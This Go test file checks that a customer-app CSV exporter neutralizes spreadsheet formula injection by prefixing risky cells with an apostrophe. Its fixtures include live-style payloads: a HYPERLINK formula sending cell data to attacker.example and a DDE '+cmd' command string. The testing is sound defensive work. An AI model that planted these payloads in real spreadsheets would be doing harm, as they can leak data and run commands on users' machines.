//go:build db

package exporter_test

import (
	"slices"
	"testing"

	"github.com/jnaranj09/open-customer/internal/attributes"
	"github.com/jnaranj09/open-customer/internal/platform/ids"
	"github.com/jnaranj09/open-customer/internal/services"
)

// A spreadsheet runs a cell that starts with = + - @, a tab or a carriage return as a formula
// (threat model T42), so every such cell, header included, starts with ' in the export.
func TestExportNeutralizesFormulaCells(t *testing.T) {
	e := newEnv(t, "USD")
	e.attribute(t, "=Etiqueta", attributes.ScopeClient, attributes.TypeText)
	e.client(t, `=HYPERLINK("https://attacker.example/?x="&B2,"Ver")`, ptr("+cmd|' /C calc'!A0"), nil)
	e.client(t, "@SUM(1+1)", ptr("-2+3"), nil)
	// The modules trim a leading tab or carriage return, so this row is written as it is.
	id, err := ids.New()
	if err != nil {
		t.Fatalf("client id: %v", err)
	}
	if _, err := e.pool.Exec(t.Context(), `INSERT INTO clients (id, name, notes) VALUES ($1, $2, $3)`, id, "\tTab", "\rRetorno"); err != nil {
		t.Fatalf("insert client: %v", err)
	}
	e.service(t, "-Servicio", 30, nil)
	if _, err := e.services.Create(t.Context(), e.pool, services.ServiceInput{
		Name: "Uñas", Description: ptr("=1+1"), DurationMin: 30, Color: "#aa3366",
	}); err != nil {
		t.Fatalf("create service: %v", err)
	}

	rows := e.csvFile(t, "clientas.csv")
	if got := rows[0][len(rows[0])-1]; got != "'=Etiqueta" {
		t.Errorf("attribute header = %q, want '=Etiqueta", got)
	}
	want := []struct{ name, notes string }{
		{`'=HYPERLINK("https://attacker.example/?x="&B2,"Ver")`, "'+cmd|' /C calc'!A0"},
		{"'@SUM(1+1)", "'-2+3"},
		{"'\tTab", "'\rRetorno"},
	}
	for i, w := range want {
		if got := column(t, rows, i+1, "nombre"); got != w.name {
			t.Errorf("row %d nombre = %q, want %q", i+1, got, w.name)
		}
		if got := column(t, rows, i+1, "notas"); got != w.notes {
			t.Errorf("row %d notas = %q, want %q", i+1, got, w.notes)
		}
	}
	if got := column(t, rows, 1, "telefono"); len(got) < 2 || got[:2] != "'+" {
		t.Errorf("telefono = %q, want it to start with '+", got)
	}
	serviceRows := e.csvFile(t, "servicios.csv")
	if got := column(t, serviceRows, 1, "nombre"); got != "'-Servicio" {
		t.Errorf("service nombre = %q, want '-Servicio", got)
	}
	if got := column(t, serviceRows, 2, "descripcion"); got != "'=1+1" {
		t.Errorf("service descripcion = %q, want '=1+1", got)
	}
	e.reply(t, "=Título", "+Texto", 0, false)
	replyRows := e.csvFile(t, "respuestas.csv")
	if got := replyRows[1][:2]; !slices.Equal(got, []string{"'=Título", "'+Texto"}) {
		t.Errorf("reply titulo, texto = %q, want them neutralized", got)
	}
}
